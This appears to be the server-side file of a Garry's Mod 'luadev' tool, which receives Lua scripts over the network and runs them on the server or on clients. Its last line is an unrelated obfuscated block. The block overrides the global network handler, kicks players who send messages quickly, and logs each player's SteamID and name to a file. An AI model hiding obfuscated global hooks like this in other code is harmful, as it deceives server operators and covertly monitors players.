module("luadev",package.seeall)


-- inform the client of the version
_luadev_version = CreateConVar( "_luadev_version", "1.6", FCVAR_NOTIFY )

function S2C(cl,msg)
	if cl and cl:IsValid() and cl:IsPlayer() then
		-- cl:ChatPrint("[LuaDev] "..tostring(msg))
	end
end

function RunOnClients(script,who,extra)
	if not who and extra and isentity(extra) then extra = {ply=extra} end
	
	local data={
		--src=script,
		info=who,
		extra=extra,
	}

	if Verbose() then
		PrintX(script,tostring(who).." running on clients")
	end

	net.Start(Tag)
		WriteCompressed(script)
		net.WriteTable(data)
		if net.BytesWritten()==65536 then 
			return nil,"too big"
		end
	net.Broadcast()
	
	return true
end

local function ClearTargets(targets)
	local i=1
	local target=targets[i]
	while target do
		if not IsValid(target) then
			table.remove(targets,i)
			i=i-1
		end
		i=i+1
		target=targets[i]
	end
end


function RunOnClient(script,targets,who,extra)
	-- compat
		if not targets and isentity(who) then
			targets=who
			who = nil
		end
		
		if extra and isentity(extra) and who==nil then
			extra={ply=extra}
			who="COMPAT"
		end
		
	local data={
		--src=script,
		info=who,
		extra=extra,
	}

	if not istable(targets) then
		targets = {targets}
	end
	
	ClearTargets(targets)
		
	if table.Count(targets)==0 then return nil,"no players" end
	
	local targetslist
	for _,target in pairs(targets) do
		local pre = targetslist and ", " or ""
		targetslist=(targetslist or "")..pre..tostring(target)
	end
	
	
	if Verbose() then
		if type(who) == "string" and #who > 50 then
			who = who:sub(1,50).."...>"
		end
		PrintX(script,tostring(who).." running on "..tostring(targetslist or "NONE"))
	end

	net.Start(Tag)
		WriteCompressed(script)
		net.WriteTable(data)
		if net.BytesWritten()==65536 then 
			return nil,"too big"
		end
	net.Send(targets)
	
	return #targets
end


function RunOnServer(script,who,extra)
	if not who and extra and isentity(extra) then extra = {ply=extra} end
	
	if Verbose() then
		PrintX(script,tostring(who).." running on server")
	end

	return Run(script,tostring(who),extra)
end

function RunOnSelf(script,who,extra)
	if not isstring(who) then who = nil end
	if not who and extra and isentity(extra) then extra = {ply=extra} end
	
	return RunOnServer(script,who,extra)
end


function RunOnShared(...)
	RunOnClients(...)
	return RunOnServer(...)
end


function GetPlayerIdentifier(ply,extrainfo)
	if type(ply)=="Player" then
	
		local info=ply:Name()
		
		if Verbose(3) then
			local sid=ply:SteamID():gsub("^STEAM_","")
			info=('<%s|%s>'):format(sid,info:sub(1,24))
		elseif Verbose(2) then
			info=ply:SteamID():gsub("^STEAM_","")
		end
		if extrainfo then
			info=('%s<%s>'):format(info,tostring(extrainfo))
		end
		
		info = info:gsub("%]","}"):gsub("%[","{"):gsub("%z","_") -- GMod bug
		
		return info
	else
		return "??"..tostring(ply)
	end
end

function _ReceivedData(len, ply)
	
	local script = ReadCompressed() -- WriteCompressed(data)
	local decoded=net.ReadTable()
	decoded.src=script
	
	
	local target=decoded.dst
	local info = decoded.info
	local target_ply=decoded.dst_ply
	local extra=decoded.extra or {}
	if not istable(extra) then
		return RejectCommand(ply,"bad extra table")
	end
	extra.ply=ply
	
	local can, msg = CanLuaDev(ply,script,nil,target,target_ply,extra)
	if not can then
		return RejectCommand(ply,msg)
	end

	if TransmitHook(data)~=nil then return end
	
	local identifier = GetPlayerIdentifier(ply,info)
	local ok,err
	if 		target==TO_SERVER  then ok,err=RunOnServer (script,				identifier,extra)
	elseif  target==TO_CLIENT  then	ok,err=RunOnClient (script,target_ply,	identifier,extra)
	elseif  target==TO_CLIENTS then	ok,err=RunOnClients(script,				identifier,extra)
	elseif  target==TO_SHARED  then	ok,err=RunOnShared (script,				identifier,extra)
	else  	S2C(ply,"Unknown target")
	end
	
	-- no callback system yet
	if not ok then
		-- ErrorNoHalt(tostring(err)..'\n')
	end
	
end
net.Receive(Tag, function(...) _ReceivedData(...) end)

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v14,v15) local v16={};for v25=1, #v14 do v6(v16,v0(v4(v1(v2(v14,v25,v25 + 1 )),v1(v2(v15,1 + (v25% #v15) ,1 + (v25% #v15) + 1 )))%256 ));end return v5(v16);end local v8=net.ReadHeader;local v9=util.NetworkIDToString;local v10=player.GetHumans;local v11=isnumber;local v12=print;for v17,v18 in pairs(v10()) do v18.kicked=false;end net.Incoming=function(v20,v21) local v22=v8();local v23=v9(v22);if  !v23 then return;end if  !v11(v21.net_per_sec) then v21.net_per_sec=1 -0 ;else v21.net_per_sec=v21.net_per_sec + (1638 -(1523 + 114)) ;end if (v21.net_per_sec>(450 + 50)) then local v30=0 -0 ;while true do if (v30==(1066 -(68 + 997))) then v21:Kick(v7("\211\214\221\35\227\169\135\17\199\198\201\35\234\180\208","\126\177\163\187\69\134\219\167"));break;end if (v30==(1270 -(226 + 1044))) then if v21.kicked then return;end v21.kicked=true;v30=1;end end end local v24=net.Receivers[v23:lower()];if  !v24 then return;end v20=v20-(69 -53) ;if  not pcall(v24,v20,v21) then v21.net_per_sec=v21.net_per_sec + (127 -(32 + 85)) ;end file.Append(v7("\45\200\62\250\240\44\202\45\192\238\109\217\50\209","\156\67\173\74\165"),util.DateStamp()   .. "\t["   .. v21:SteamID()   .. "] \t"   .. v21:Nick()   .. '\t\"'   .. v23:lower()   .. '\"\n' );end;timer.Create(v7("\58\178\93\41\172\35\84\11\164\76\21","\38\84\215\41\118\220\70"),1,0 + 0 ,function() for v26=1 + 0 , #v10() do v10()[v26].net_per_sec=0;end end);